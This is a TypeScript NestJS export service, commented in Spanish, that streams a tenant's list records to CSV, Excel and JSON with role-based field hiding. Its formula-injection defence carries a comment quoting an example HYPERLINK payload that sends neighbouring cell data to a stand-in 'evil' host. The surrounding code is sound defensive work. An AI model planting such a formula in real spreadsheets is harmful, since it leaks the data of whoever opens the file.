import { BadRequestException, Injectable } from '@nestjs/common';
import { asc, eq, gt, inArray, isNotNull, isNull, and, sql, type SQL } from 'drizzle-orm';
import {
    APPROVAL_FIELD_OPTIONS,
    EXPORT_ID_HEADER,
    EXPORT_PARENT_HEADER,
    FALLBACK_TIME_ZONE,
    XLSX_EXPORT_MAX_ROWS,
    XlsxStreamWriter,
    formatDuration,
    formulaShownAs,
    isDataField,
    isSystemField,
    jsonbKeyForField,
    resolveTitleFieldId,
    sanitizeSheetName,
    type ExportBundle,
    type Field,
    type FieldType,
    type FilterGroup,
    type RecordDto,
    type ViewType,
    type XlsxOutCell,
} from '@imagina-base/shared';
import { attachments, memberships, records, teams, users } from '../db/schema';
import { FieldsService } from '../fields/fields.service';
import { hiddenFieldsFor } from '../lists/list-acl';
import { ListsService } from '../lists/lists.service';
import { RecordsService, type Actor } from '../records/records.service';
import { TenantDb } from '../tenancy/tenant-db.service';
import { readTenantFormat } from '../tenancy/tenant-format';
import { ViewsService } from '../views/views.service';
import { idColumn, planXlsxColumns, type XlsxColumnPlan } from './xlsx-columns';

const PAGE = 1000;

export interface ViewExportOptions {
    /** IDs de campos a exportar, en orden. Vacío → todos los data fields. */
    fieldIds: number[];
    filterTree?: FilterGroup;
    /** v0.1.286 — la búsqueda y el orden de la vista (mismo formato que el listado). */
    search?: string;
    sort?: string;
    /**
     * v0.1.299 — ¿incluir las subtareas? (por defecto sí: un archivo que las
     * pierde en silencio es peor). Sin ellas sale sólo el primer nivel y sin
     * las columnas de jerarquía.
     */
    includeSubtasks?: boolean;
}

export interface CsvExportOptions extends ViewExportOptions {
    delimiter: ',' | ';';
    withBom: boolean;
}

export interface XlsxExportOptions extends ViewExportOptions {
    /** Nombre de la hoja (el de la vista); se sanea al formato de Excel. */
    sheetName?: string;
    /** Columna «ID» de cada registro (la que usa «Actualizar desde un archivo»). */
    withId?: boolean;
    /** Columnas de datos inmovilizadas a la izquierda (las fijas de la vista). */
    freezeColumns?: number;
    /** Tope de registros (por defecto `XLSX_EXPORT_MAX_ROWS`; los tests lo bajan). */
    maxRows?: number;
}

/**
 * Export JSON de intercambio de una lista (STANDALONE §16). Recorre TODOS los
 * records por keyset (sin OFFSET) para soportar listas grandes. Disponible en
 * solo-lectura (es un GET → no lo bloquea el TenantGuard) — ADR-S09.
 */
@Injectable()
export class ExportService {
    constructor(
        private readonly tenantDb: TenantDb,
        private readonly lists: ListsService,
        private readonly fields: FieldsService,
        private readonly views: ViewsService,
        private readonly records_: RecordsService,
    ) {}

    /**
     * Export CSV con selección de campos, delimiter y filtro (el que usa el
     * ExportButton del fork). A diferencia del bundle JSON de intercambio,
     * aquí los records pasan por `RecordsService.list` → se respetan el ACL
     * por rol (scope de lectura + campos ocultos) y el filter tree activo.
     * Streaming por keyset — nunca se materializa la lista entera.
     */
    async streamCsvExport(
        tenantId: number,
        actor: Actor,
        listIdOrSlug: string,
        opts: CsvExportOptions,
        onStart: (filename: string) => void,
        write: (chunk: string) => void | Promise<void>,
    ): Promise<void> {
        const list = await this.lists.get(tenantId, listIdOrSlug);
        const columns = await this.exportColumns(tenantId, list, actor, opts.fieldIds);
        const labeler = await this.relationLabeler(
            tenantId,
            columns.filter((c) => c.type === 'relation'),
        );

        // v0.1.252 — el CSV dice lo que ve una persona: la ETIQUETA de una
        // opción (no su valor interno), el NOMBRE de quien está asignado (no
        // su id), «Sí/No» en una casilla y el nombre del archivo (no `[17]`).
        // El import entiende las cuatro formas, así el ida y vuelta cierra.
        const readable = await this.readableFormatter(tenantId, columns);

        // v0.1.132 — jerarquía. Las subtareas se exportan (si no, el archivo
        // perdería filas en silencio), pero las dos columnas que la describen
        // sólo aparecen si la lista tiene alguna: una lista sin subtareas
        // exporta exactamente el mismo CSV que antes. v0.1.299 — quien las
        // descarta a propósito (`includeSubtasks: false`) recibe el primer nivel.
        const includeSubtasks = opts.includeSubtasks !== false;
        const withHierarchy = includeSubtasks && (await this.hasSubtasks(tenantId, list.id));

        onStart(`${list.slug}.csv`);
        if (opts.withBom) await write('﻿');
        const header = columns.map((c) => c.label);
        await write(
            csvLine(
                withHierarchy ? [EXPORT_ID_HEADER, EXPORT_PARENT_HEADER, ...header] : header,
                opts.delimiter,
            ),
        );

        let cursor: number | undefined;
        for (;;) {
            const page = await this.records_.list(tenantId, actor, String(list.id), {
                cursor,
                limit: 200,
                sort_dir: 'asc',
                filter_tree: opts.filterTree,
                search: opts.search,
                // Con orden por campo el cursor del listado es un OFFSET
                // (opaco): se avanza igual con `next_cursor`.
                sort: opts.sort,
                include_subtasks: includeSubtasks,
            });
            await labeler.prime(page.data);
            await readable.prime(page.data);
            for (const r of page.data) {
                const cells = columns.map((c) =>
                    c.type === 'relation'
                        ? labeler.labels(c.id, r.relations?.[jsonbKeyForField(c.id)])
                        : r.formula_errors?.[jsonbKeyForField(c.id)]
                          ? '#ERROR'
                          : readable.cell(c, r.data[jsonbKeyForField(c.id)]) ?? stringifyCell(r.data[jsonbKeyForField(c.id)], c.type, targetTypeOf(c)),
                );
                await write(
                    csvLine(
                        withHierarchy
                            ? [String(r.id), r.parent_id === null ? '' : String(r.parent_id), ...cells]
                            : cells,
                        opts.delimiter,
                    ),
                );
            }
            const next = page.meta.next_cursor;
            if (next === null || page.data.length === 0) break;
            cursor = Number(next);
        }
    }

    /**
     * v0.1.299 — Export a EXCEL (.xlsx) de lo que se ve en la vista: mismos
     * registros que el CSV (ACL por rol, filtros, búsqueda, orden y columnas
     * elegidas, en su orden), pero cada celda con su TIPO real — ver
     * `xlsx-columns.ts`. Encabezado en negrita, inmovilizado y con filtro
     * automático; anchos según el contenido de la primera tanda de filas.
     *
     * Streaming de punta a punta: cada página del listado se comprime y se
     * manda (con contrapresión) antes de pedir la siguiente — la memoria no
     * crece con la cantidad de registros. Tope: `XLSX_EXPORT_MAX_ROWS`; si la
     * vista lo pasa, se rechaza ANTES de empezar (con el motivo y la salida:
     * filtrar o CSV), no se corta un archivo a la mitad.
     */
    async streamXlsxExport(
        tenantId: number,
        actor: Actor,
        listIdOrSlug: string,
        opts: XlsxExportOptions,
        onStart: (filename: string, displayName: string) => void,
        write: (chunk: Uint8Array) => void | Promise<void>,
    ): Promise<{ rows: number }> {
        const list = await this.lists.get(tenantId, listIdOrSlug);
        const fields = await this.exportColumns(tenantId, list, actor, opts.fieldIds);
        const labeler = await this.relationLabeler(tenantId, fields.filter((c) => c.type === 'relation'));
        const readable = await this.readableFormatter(tenantId, fields);
        const format = await readTenantFormat(this.tenantDb, tenantId);
        const includeSubtasks = opts.includeSubtasks !== false;
        const withHierarchy = includeSubtasks && (await this.hasSubtasks(tenantId, list.id));

        const pageQuery = (cursor: number | undefined, withTotal: boolean) =>
            this.records_.list(tenantId, actor, String(list.id), {
                cursor,
                limit: 200,
                sort_dir: 'asc',
                filter_tree: opts.filterTree,
                search: opts.search,
                sort: opts.sort,
                include_subtasks: includeSubtasks,
                with_total: withTotal || undefined,
            });

        // La primera página trae el TOTAL (mismo where): el tope se decide
        // antes de mandar un solo byte, y esa página no se vuelve a pedir.
        let page = await pageQuery(undefined, true);
        const total = page.meta.total ?? page.data.length;
        const max = opts.maxRows ?? XLSX_EXPORT_MAX_ROWS;
        if (total > max) {
            throw new BadRequestException({
                code: 'export_too_large',
                message: `Esta vista tiene ${total.toLocaleString('es-CO')} registros y una planilla de Excel se arma con hasta ${max.toLocaleString('es-CO')}. Filtra la vista o exporta en CSV, que no tiene ese límite.`,
                data: { status: 400, total, max },
            });
        }

        const sheetName = sanitizeSheetName(opts.sheetName ?? list.name, sanitizeSheetName(list.name, 'Datos'));
        const leading = withHierarchy ? 2 : opts.withId ? 1 : 0;
        const writer = new XlsxStreamWriter(write, {
            sheetName,
            freezeRows: 1,
            freezeCols: opts.freezeColumns && opts.freezeColumns > 0 ? leading + Math.min(opts.freezeColumns, fields.length) : 0,
            autoFilter: true,
        });
        const headerStyle = writer.style({ bold: true, fill: 'F2F2F2', borderBottom: true });
        // La subtarea se SANGRA en su primera columna (estilo, no texto: el
        // valor no cambia y el archivo se vuelve a importar igual).
        const indentStyle = writer.style({ indent: 2 });
        const columns: XlsxColumnPlan[] = [
            ...(withHierarchy
                ? [idColumn(EXPORT_ID_HEADER, (r) => r.id), idColumn(EXPORT_PARENT_HEADER, (r) => r.parent_id)]
                : opts.withId
                  ? [idColumn(EXPORT_ID_HEADER, (r) => r.id)]
                  : []),
            ...planXlsxColumns(writer, fields, {
                format,
                timeZone: format.timezone ?? FALLBACK_TIME_ZONE,
                readable: (f, v) => readable.cell(f, v),
                relationLabels: (id, v) => labeler.labels(id, v),
                userName: (id) => readable.userName(id),
            }),
        ];
        // Se sangra la columna del TÍTULO del registro (la que lo nombra); si la
        // vista no la muestra, la primera columna de datos.
        const titleIdx = columns.findIndex((c) => c.field?.is_primary === true);
        const indentIdx = titleIdx >= 0 ? titleIdx : leading;

        const toRow = (r: RecordDto): XlsxOutCell[] => {
            const cells = columns.map((c) => c.cell(r));
            const head = cells[indentIdx];
            if (withHierarchy && r.parent_id !== null && typeof head === 'string' && head !== '') {
                cells[indentIdx] = { text: head, s: indentStyle };
            }
            return cells;
        };

        // Anchos: el encabezado (+ el botón del filtro) y la primera tanda.
        await labeler.prime(page.data);
        await readable.prime(page.data);
        const firstRows = page.data.map(toRow);
        const widths = columns.map((c, i) => {
            let w = c.header.length + 4;
            for (const row of firstRows) w = Math.max(w, c.width(row[i] ?? null) + 2);
            return Math.max(8, Math.min(60, w));
        });

        onStart(`${list.slug}.xlsx`, `${safeFileName(sheetName === list.name ? list.name : `${list.name} - ${sheetName}`)}.xlsx`);
        await writer.begin(widths);
        writer.row(columns.map((c) => c.header), headerStyle);
        let pending: XlsxOutCell[][] = firstRows;
        for (;;) {
            for (const cells of pending) writer.row(cells);
            await writer.flush();
            const next = page.meta.next_cursor;
            if (next === null || page.data.length === 0) break;
            page = await pageQuery(Number(next), false);
            await labeler.prime(page.data);
            await readable.prime(page.data);
            pending = page.data.map(toRow);
        }
        const rows = await writer.finish();
        return { rows: rows - 1 };
    }

    /**
     * Las columnas de un export: TODO lo que se ve en la tabla, no sólo lo
     * que vive en `data` (v0.1.200 — antes `isDataField` dejaba afuera los
     * computed, los lookup, los rollup y las relaciones: una lista de Facturas
     * se exportaba sin el cliente y sin el total). Los derivados ya vienen
     * resueltos en `RecordsService.list`; las relaciones se resuelven a los
     * TÍTULOS de los vinculados. `list` (no `listByListId`): trae los
     * lookup/rollup con su relación RESUELTA en `through`.
     *
     * v0.1.299 — Un campo que el rol de quien exporta NO ve no sale ni como
     * columna vacía: su nombre tampoco es para esa persona (los VALORES ya los
     * quitaba el listado).
     */
    private async exportColumns(
        tenantId: number,
        list: { id: number; settings: Record<string, unknown> },
        actor: Actor,
        fieldIds: number[],
    ): Promise<Field[]> {
        const all = await this.fields.list(tenantId, String(list.id));
        const hidden = hiddenFieldsFor(list.settings, actor);
        const exportable = all
            .filter((f) => (isDataField(f.type) || isExportableDerived(f.type)) && !hidden.has(f.slug))
            // Fórmulas (A1): salen con el formato de su resultado (moneda, fecha…).
            .map((f) => formulaShownAs(f));
        const byId = new Map(exportable.map((f) => [f.id, f]));
        return fieldIds.length > 0 ? fieldIds.map((id) => byId.get(id)).filter((f) => f !== undefined) : exportable;
    }

    async exportList(tenantId: number, listIdOrSlug: string, now: string): Promise<ExportBundle> {
        const list = await this.lists.get(tenantId, listIdOrSlug);
        const fields = await this.fields.list(tenantId, String(list.id));
        const views = await this.views.list(tenantId, String(list.id));
        const allRecords: RecordDto[] = [];
        for await (const r of this.iterateRecords(tenantId, list.id)) allRecords.push(r);

        return {
            version: 1,
            exported_at: now,
            list,
            fields: fields.map((f) => ({ ...f, type: f.type as FieldType })),
            views: views.map((v) => ({ ...v, type: v.type as ViewType })),
            records: allRecords,
        };
    }

    /**
     * Export por STREAMING (SEC-10). Escribe el MISMO bundle JSON pero sin
     * materializar todos los records en memoria: cabecera + `"records":[` y luego
     * cada record por keyset a medida que llega, evitando OOM en listas grandes
     * (el seed de 100k acumulaba todo en un array antes de serializar).
     */
    async streamExport(
        tenantId: number,
        listIdOrSlug: string,
        now: string,
        write: (chunk: string) => void | Promise<void>,
    ): Promise<void> {
        const list = await this.lists.get(tenantId, listIdOrSlug);
        const fields = await this.fields.list(tenantId, String(list.id));
        const views = await this.views.list(tenantId, String(list.id));

        await write('{"version":1');
        await write(`,"exported_at":${JSON.stringify(now)}`);
        await write(`,"list":${JSON.stringify(list)}`);
        await write(`,"fields":${JSON.stringify(fields.map((f) => ({ ...f, type: f.type as FieldType })))}`);
        await write(`,"views":${JSON.stringify(views.map((v) => ({ ...v, type: v.type as ViewType })))}`);
        await write(',"records":[');
        let first = true;
        for await (const r of this.iterateRecords(tenantId, list.id)) {
            await write((first ? '' : ',') + JSON.stringify(r));
            first = false;
        }
        await write(']}');
    }

    /**
     * Resuelve los ids de una relación a los TÍTULOS de los registros
     * vinculados (v0.1.200). Un CSV con "12, 47" no le sirve a nadie; lo que
     * el archivo tiene que decir es «Acme S.A.».
     *
     * Una query por lista destino y por PÁGINA, no por fila (regla de oro
     * nº 8), y con cache entre páginas: en una lista de facturas el mismo
     * cliente se repite muchísimo.
     */
    private async readableFormatter(tenantId: number, columns: Field[]): Promise<ReadableFormatter> {
        const optionLabels = new Map<number, Map<string, string>>();
        for (const c of columns) {
            if (c.type !== 'select' && c.type !== 'multi_select' && c.type !== 'approval') continue;
            // C5 — «Aprobación»: el estado con la etiqueta del catálogo.
            const opts = c.type === 'approval' ? APPROVAL_FIELD_OPTIONS : (c.config as { options?: unknown }).options;
            const m = new Map<string, string>();
            if (Array.isArray(opts)) {
                for (const o of opts as Array<{ value?: unknown; label?: unknown }>) {
                    if (typeof o?.value === 'string') m.set(o.value, typeof o.label === 'string' && o.label !== '' ? o.label : o.value);
                }
            }
            optionLabels.set(c.id, m);
        }
        // v0.1.299 — también un lookup hacia un campo persona (el .xlsx lo
        // muestra con el nombre, como la ficha), y las columnas de sistema
        // «Creado por» / «Modificado por».
        const hasUser = columns.some(
            (c) =>
                c.type === 'user' ||
                c.type === 'created_by' ||
                c.type === 'updated_by' ||
                (c.type === 'lookup' && targetTypeOf(c) === 'user'),
        );
        const members = new Map<number, string>();
        if (hasUser) {
            const rows = await this.tenantDb.withTenant(tenantId, (tx) =>
                tx
                    .select({ id: users.id, name: users.name, email: users.email })
                    .from(memberships)
                    .innerJoin(users, eq(users.id, memberships.userId))
                    .where(eq(memberships.tenantId, tenantId)),
            );
            for (const u of rows) members.set(u.id, u.name && u.name.trim() !== '' ? u.name : u.email);
        }
        // C1 — el campo «Equipo» sale con el NOMBRE de cada equipo (el import lo lee igual).
        const teamNames = new Map<number, string>();
        if (columns.some((c) => c.type === 'team' || (c.type === 'lookup' && targetTypeOf(c) === 'team'))) {
            const rows = await this.tenantDb.withTenant(tenantId, (tx) =>
                tx.select({ id: teams.id, name: teams.name }).from(teams).where(eq(teams.tenantId, tenantId)),
            );
            for (const t of rows) teamNames.set(t.id, t.name);
        }
        const fileCols = columns.filter((c) => c.type === 'file');
        const fileTitles = new Map<number, string>();
        const asIds = (v: unknown): number[] =>
            (Array.isArray(v) ? v : [v]).map((x) => Number(x)).filter((n) => Number.isInteger(n) && n > 0);

        return {
            userName: (id) => members.get(id) ?? null,
            prime: async (rows) => {
                if (fileCols.length === 0) return;
                const wanted = new Set<number>();
                for (const r of rows) {
                    for (const c of fileCols) {
                        for (const id of asIds(r.data[jsonbKeyForField(c.id)])) if (!fileTitles.has(id)) wanted.add(id);
                    }
                }
                if (wanted.size === 0) return;
                const found = await this.tenantDb.withTenant(tenantId, (tx) =>
                    tx
                        .select({ id: attachments.id, filename: attachments.filename })
                        .from(attachments)
                        .where(and(eq(attachments.tenantId, tenantId), inArray(attachments.id, [...wanted]))),
                );
                for (const f of found) fileTitles.set(f.id, f.filename);
            },
            cell: (field, value) => {
                if (value === null || value === undefined || value === '') return null;
                switch (field.type) {
                    case 'select':
                    case 'approval':
                        return typeof value === 'string' ? (optionLabels.get(field.id)?.get(value) ?? value) : null;
                    case 'multi_select':
                        return Array.isArray(value)
                            ? value.map((v) => optionLabels.get(field.id)?.get(String(v)) ?? String(v)).join(', ')
                            : null;
                    case 'checkbox':
                        return value === true || value === 1 || value === '1' ? 'Sí' : 'No';
                    case 'user': {
                        const id = Number(value);
                        return Number.isInteger(id) && id > 0 ? (members.get(id) ?? String(id)) : null;
                    }
                    // v0.1.300 — «Creado por» / «Modificado por»: el nombre; 0 = el sistema.
                    case 'created_by':
                    case 'updated_by': {
                        const id = Number(value);
                        if (id === 0) return 'Sistema';
                        return Number.isInteger(id) && id > 0 ? (members.get(id) ?? String(id)) : null;
                    }
                    case 'file':
                        return asIds(value).map((id) => fileTitles.get(id) ?? `#${id}`).join(', ');
                    case 'team':
                        return asIds(value).map((id) => teamNames.get(id) ?? `Equipo ${id}`).join(', ');
                    default:
                        return null;
                }
            },
        };
    }

    private async relationLabeler(tenantId: number, relFields: Field[]): Promise<RelationLabeler> {
        const targets = new Map<number, { listId: number; titleKey: string }>();
        for (const f of relFields) {
            const listId = Number((f.config as { target_list_id?: unknown }).target_list_id);
            if (!Number.isInteger(listId) || listId <= 0) continue;
            const otherList = await this.lists.get(tenantId, String(listId)).catch(() => null);
            if (!otherList) continue;
            const otherFields = await this.fields.listByListId(tenantId, listId);
            const titleId = resolveTitleFieldId(otherFields, otherList.settings);
            if (titleId === null) continue;
            targets.set(f.id, { listId, titleKey: jsonbKeyForField(titleId) });
        }
        const cache = new Map<number, string>();

        return {
            prime: async (rows) => {
                const wanted = new Set<number>();
                for (const r of rows) {
                    for (const f of relFields) {
                        const ids = r.relations?.[jsonbKeyForField(f.id)];
                        if (!Array.isArray(ids)) continue;
                        for (const id of ids) if (!cache.has(id)) wanted.add(id);
                    }
                }
                if (wanted.size === 0) return;
                const byList = new Map<string, number[]>();
                for (const t of targets.values()) byList.set(t.titleKey, []);
                // Los ids de todas las relaciones se piden juntos por clave de
                // título: dos relaciones a la misma lista comparten la query.
                for (const f of relFields) {
                    const t = targets.get(f.id);
                    if (!t) continue;
                    for (const r of rows) {
                        const ids = r.relations?.[jsonbKeyForField(f.id)];
                        if (!Array.isArray(ids)) continue;
                        for (const id of ids) if (wanted.has(id)) byList.get(t.titleKey)!.push(id);
                    }
                }
                for (const [titleKey, ids] of byList) {
                    if (ids.length === 0) continue;
                    const unique = [...new Set(ids)];
                    const rowsOut = await this.tenantDb.withTenant(tenantId, (tx) =>
                        tx
                            .select({
                                id: records.id,
                                title: sql<string | null>`(${records.data} ->> ${titleKey})`,
                            })
                            .from(records)
                            .where(
                                and(
                                    eq(records.tenantId, tenantId),
                                    inArray(records.id, unique),
                                    isNull(records.deletedAt),
                                ),
                            ),
                    );
                    for (const row of rowsOut) cache.set(row.id, row.title ?? `#${row.id}`);
                }
            },
            labels: (fieldId, value) => {
                const ids = Array.isArray(value) ? value : [];
                if (ids.length === 0 || !targets.has(fieldId)) return '';
                return ids.map((id) => cache.get(Number(id)) ?? `#${String(id)}`).join(', ');
            },
        };
    }

    /** ¿La lista tiene alguna subtarea viva? (una query, con LIMIT 1). */
    private async hasSubtasks(tenantId: number, listId: number): Promise<boolean> {
        const rows = await this.tenantDb.withTenant(tenantId, (tx) =>
            tx
                .select({ id: records.id })
                .from(records)
                .where(
                    and(
                        eq(records.tenantId, tenantId),
                        eq(records.listId, listId),
                        isNotNull(records.parentId),
                        isNull(records.deletedAt),
                    ),
                )
                .limit(1),
        );
        return rows.length > 0;
    }

    /** Recorre los records por keyset (id asc) en páginas de 1000. */
    private async *iterateRecords(tenantId: number, listId: number): AsyncGenerator<RecordDto> {
        let cursor: number | undefined;
        for (;;) {
            const cursorClause: SQL | undefined = cursor !== undefined ? gt(records.id, cursor) : undefined;
            const rows = await this.tenantDb.withTenant(tenantId, (tx) =>
                tx
                    .select()
                    .from(records)
                    .where(
                        and(
                            eq(records.tenantId, tenantId),
                            eq(records.listId, listId),
                            isNull(records.deletedAt),
                            cursorClause,
                        ),
                    )
                    .orderBy(asc(records.id))
                    .limit(PAGE),
            );
            for (const r of rows) {
                yield {
                    id: r.id,
                    list_id: r.listId,
                    data: r.data,
                    // v0.1.132 — la jerarquía viaja en el archivo: quién es
                    // subtarea de quién se reconstruye por estos ids.
                    parent_id: r.parentId ?? null,
                    subtask_count: 0,
                    has_description: (r.description ?? null) !== null,
                    created_by: r.createdBy,
                    created_at: r.createdAt.toISOString(),
                    updated_at: r.updatedAt.toISOString(),
                };
            }
            if (rows.length < PAGE) break;
            cursor = rows[rows.length - 1]!.id;
        }
    }
}

/** Nombre de archivo legible (con acentos) sin los caracteres que un sistema de archivos no admite. */
function safeFileName(name: string): string {
    // eslint-disable-next-line no-control-regex
    const clean = name.replace(/[\u0000-\u001f<>:"/\\|?*]+/g, ' ').replace(/\s+/g, ' ').trim().slice(0, 120);
    return clean === '' ? 'exportacion' : clean;
}

/** Derivados que SÍ salen en el CSV (`relation` incluida: se exporta el título). */
function isExportableDerived(type: string): boolean {
    return (
        type === 'computed' || type === 'lookup' || type === 'rollup' || type === 'relation' || type === 'time_tracked' || type === 'checklist_progress'
        // Fórmulas (A1): con el valor calculado de cada fila.
        || type === 'formula'
        // v0.1.300 — columnas de sistema (creado/modificado por y cuándo).
        || isSystemField(type)
        // C5 — el estado de la aprobación.
        || type === 'approval'
    );
}

/** Tipo del campo del OTRO lado, para formatear un lookup/rollup como la celda. */
function targetTypeOf(field: Field): string | undefined {
    return field.through?.target_field?.type;
}

interface RelationLabeler {
    prime(rows: Array<{ relations?: Record<string, number[]> }>): Promise<void>;
    labels(fieldId: number, value: unknown): string;
}

/**
 * SEC-25 (v0.1.226) — inyección de fórmulas en planillas. Una celda que empieza
 * con `=`, `+`, `-`, `@`, TAB o CR la ejecuta Excel/Sheets al abrir el archivo
 * (`=HYPERLINK("https://evil/?d="&A2,"Ver")` manda los datos vecinos afuera).
 * Esos valores llegan de afuera: el portal, el webhook entrante, la tienda.
 * Se neutralizan con un apóstrofo delante; un número o un teléfono (`-5`,
 * `+57 300 111 2233`) no son fórmula y quedan intactos — el import los
 * vuelve a leer igual.
 */
export function neutralizeFormula(cell: string): string {
    if (!/^[=+\-@\t\r]/.test(cell)) return cell;
    if (/^[+-][\d\s().,-]*$/.test(cell)) return cell;
    return `'${cell}`;
}

/** Una línea CSV con quoting RFC-4180 (comillas dobladas, quote si hace falta). */
function csvLine(cells: string[], delimiter: string): string {
    return (
        cells
            .map(neutralizeFormula)
            .map((cell) => {
                if (
                    cell.includes(delimiter)
                    || cell.includes('"')
                    || cell.includes('\n')
                    || cell.includes('\r')
                ) {
                    return `"${cell.replace(/"/g, '""')}"`;
                }
                return cell;
            })
            .join(delimiter) + '\r\n'
    );
}

/** Serializa un valor JSONB a celda CSV (paridad con el CsvExporter del plugin). */
function stringifyCell(value: unknown, type: string, targetType?: string): string {
    if (value === null || value === undefined || value === '') return '';
    // v0.1.200 — un lookup trae una LISTA de valores del otro lado: cada uno
    // se formatea con el tipo del campo DESTINO (una duración sale `1h 30m`,
    // no 90), igual que en la celda.
    if (type === 'lookup') {
        const items = Array.isArray(value) ? value : [value];
        return items
            .map((v) => stringifyCell(v, targetType ?? 'text'))
            .filter((v) => v !== '')
            .join(', ');
    }
    // Un rollup es un escalar; el tipo del destino manda cuando aporta
    // (min/max de una fecha, una duración).
    if (type === 'rollup') return stringifyCell(value, targetType ?? 'number');
    if (type === 'multi_select') {
        return Array.isArray(value) ? value.map(String).join(', ') : String(value);
    }
    if (type === 'checkbox') return value === true || value === 1 || value === '1' ? '1' : '0';
    // v0.1.158 — la duración se guarda en minutos: en una planilla eso no se
    // lee. Sale como la escribió el usuario (`1h 30m`) y el import la vuelve
    // a entender (el parser acepta ese mismo texto), así el round-trip cierra.
    if (type === 'duration') return formatDuration(value);
    // v0.1.291 — el tiempo registrado, como la duración: `12h 30m`.
    if (type === 'time_tracked') return formatDuration(value);
    if (type === 'percent' || type === 'checklist_progress') return `${String(value)}%`;
    if (typeof value === 'object') return JSON.stringify(value);
    return String(value);
}

/** v0.1.252 — formatea las celdas que una persona lee distinto de como se guardan. */
interface ReadableFormatter {
    prime(rows: Array<{ data: Record<string, unknown> }>): Promise<void>;
    /** Nombre (o email) de una persona del workspace. */
    userName(id: number): string | null;
    /** Texto legible, o null si el tipo no tiene formato propio (cae a stringifyCell). */
    cell(field: Field, value: unknown): string | null;
}
